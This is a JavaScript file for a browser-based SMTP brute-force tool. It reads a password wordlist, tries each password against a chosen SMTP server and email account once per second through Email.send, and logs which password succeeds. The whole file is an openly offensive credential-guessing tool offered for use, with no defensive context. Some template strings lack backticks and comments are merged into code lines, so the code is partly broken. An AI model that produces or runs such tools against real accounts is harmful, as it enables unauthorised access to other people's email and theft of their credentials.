// SMTP Brute Force Tool - script.js

// Select DOM elements const smtpServerInput = document.getElementById("smtpServer"); const portInput = document.getElementById("port"); const emailInput = document.getElementById("email"); const wordlistInput = document.getElementById("wordlist"); const startBtn = document.getElementById("startBtn"); const logDiv = document.getElementById("log");

// Event Listener for Start Button startBtn.addEventListener("click", () => { const smtpServer = smtpServerInput.value.trim(); const port = portInput.value.trim(); const email = emailInput.value.trim(); const wordlistFile = wordlistInput.files[0];

if (!smtpServer || !port || !email || !wordlistFile) {
    updateLog("All fields are required.");
    return;
}

const reader = new FileReader();
reader.onload = function(e) {
    const passwords = e.target.result.split("\n");
    startBruteForce(smtpServer, port, email, passwords);
};
reader.readAsText(wordlistFile);

});

// Function to start brute force attack function startBruteForce(smtpServer, port, email, passwords) { updateLog(Starting brute force on ${email}...); passwords.forEach((password, index) => { setTimeout(() => { attemptLogin(smtpServer, port, email, password); }, index * 1000); // 1 second interval }); }

// Function to attempt SMTP login function attemptLogin(smtpServer, port, email, password) { Email.send({ Host: smtpServer, Username: email, Password: password, To: email, From: email, Subject: "SMTP Login Test", Body: "Testing SMTP login..." }).then(() => { updateLog(Success: ${password}); }).catch(() => { updateLog(Failed: ${password}); }); }

// Function to update log output function updateLog(message) { logDiv.innerHTML += message + "<br>"; logDiv.scrollTop = logDiv.scrollHeight; }

